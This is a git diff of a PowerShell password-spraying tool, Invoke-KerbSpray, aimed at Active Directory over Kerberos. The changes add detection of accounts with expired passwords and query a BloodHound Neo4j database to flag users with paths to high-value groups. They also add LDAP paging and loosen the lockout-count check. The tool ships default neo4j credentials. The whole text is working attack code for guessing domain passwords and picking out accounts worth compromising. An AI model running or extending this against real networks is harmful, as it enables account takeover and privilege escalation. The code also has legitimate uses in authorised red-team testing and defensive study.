@@ -122,7 +122,7 @@ function Invoke-KerbSpray {
         [Switch]
         $BloodHound,
 
-		[ValidateNotNullOrEmpty()]
+        [ValidateNotNullOrEmpty()]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]
         $Credential = (New-Object System.Management.Automation.PSCredential ("neo4j", $(ConvertTo-SecureString 'neo4j' -AsPlainText -Force))),
@@ -186,11 +186,9 @@ function Invoke-KerbSpray {
         }
     }
     elseif ($LdapUser) {
-        Write-Host "[*] Retrieving the enabled users from the domain $Domain"
         $users = Get-LdapUser -Server $Server -LdapUser $LdapUser -LdapPass $LdapPass | Select samAccountName,badPwdCount
-
         ForEach ($user in $users) {
-            if (($user.badPwdCount -ne $null) -and ($user.badPwdCount -le $Limit)) {
+            if ($user.badPwdCount -le $Limit) {
                 $cred = @{Username = $user.samAccountName; Password = $Password; Hash = $Hash; BadPwdCount = $user.badPwdCount}
                 $credentials.add($cred) | Out-Null
             }
@@ -257,6 +255,30 @@ function Invoke-KerbSpray {
             elseif ($error_code -eq 6) {
                 Write-Verbose "$($cred.Username)@$($Domain) does not exist"
             }
+            # KDC_ERR_KEY_EXPIRED
+            elseif ($error_code -eq 23) {
+                if ($BloodHound) {
+                    $pathNb = 0
+                    $bhPath = $null
+                    $query = "
+                    MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[r*1..]->(m)) 
+                    RETURN COUNT(p) AS pathNb
+                    "
+                    try {
+                        $result = Invoke-BloodHoundQuery -Query $query -Credential $Credential -Neo4jHost $Neo4jHost -Neo4jPort $Neo4jPort
+                        $pathNb = $result.data[0] | Where-Object {$_}
+                        if ($pathNb -gt 0) {
+                            $bhPath = ' [PATH TO HIGH VALUE TARGETS]'
+                        }
+                    }
+                    catch {
+                        Write-Warning $Error[0].ErrorDetails.Message
+                    }
+                }
+                Write-Host "[+] $($cred.Username)@$($Domain) failed to authenticate" -NoNewline
+                Write-Host " [expired password]" -ForegroundColor Yellow -NoNewline
+                Write-Host $bhPath -ForegroundColor Red
+            }
             # KDC_ERR_PREAUTH_FAILED
             elseif ($error_code -eq 24) {
                 $newBadPwdCount = $null
@@ -265,7 +287,7 @@ function Invoke-KerbSpray {
                 }
                 if (($newBadPwdCount -ne $null) -and ($newBadPwdCount -eq $cred.BadPwdCount)) {
                         Write-Host "[+] $($cred.Username)@$($Domain) failed to authenticate" -NoNewline
-                        Write-Host " [old password detected]" -ForegroundColor Yellow
+                        Write-Host " [old password]" -ForegroundColor Yellow
                 }
                 else {
                     Write-Verbose "$($cred.Username)@$($Domain) failed to authenticate"
@@ -276,7 +298,6 @@ function Invoke-KerbSpray {
                 if ($BloodHound) {
                     $pathNb = 0
                     $bhPath = $null
-                    #$query = "MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group),p=shortestPath((n)-[r*1..]->(m)) WHERE m.objectsid ENDS WITH "-512"  RETURN COUNT(p) AS pathNb"
                     $query = "
                     MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[r*1..]->(m)) 
                     RETURN COUNT(p) AS pathNb
@@ -322,7 +343,6 @@ function Invoke-KerbSpray {
                 if ($BloodHound) {
                     $pathNb = 0
                     $bhPath = $null
-                    #$query = "MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group),p=shortestPath((n)-[r*1..]->(m)) WHERE m.objectsid ENDS WITH "-512"  RETURN COUNT(p) AS pathNb"
                     $query = "
                     MATCH (n:User {name:'$($cred.Username.ToUpper())@$($Domain.ToUpper())'}),(m:Group {highvalue:true}),p=shortestPath((n)-[r*1..]->(m)) 
                     RETURN COUNT(p) AS pathNb
@@ -362,6 +382,10 @@ function Local:Get-LdapUser {
         [String[]]
         $Properties = "*",
 
+        [ValidateRange(1,10000)] 
+        [Int]
+        $PageSize = 200,
+
         [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
         [String]
@@ -396,6 +420,8 @@ function Local:Get-LdapUser {
     else {
         $searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$searchString)
     }
+    $searcher.PageSize = $PageSize
+    $searcher.CacheResults = $false
     $searcher.filter = $filter
     $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
     $searcher.PropertiesToLoad.AddRange(($propertiesToLoad)) | Out-Null
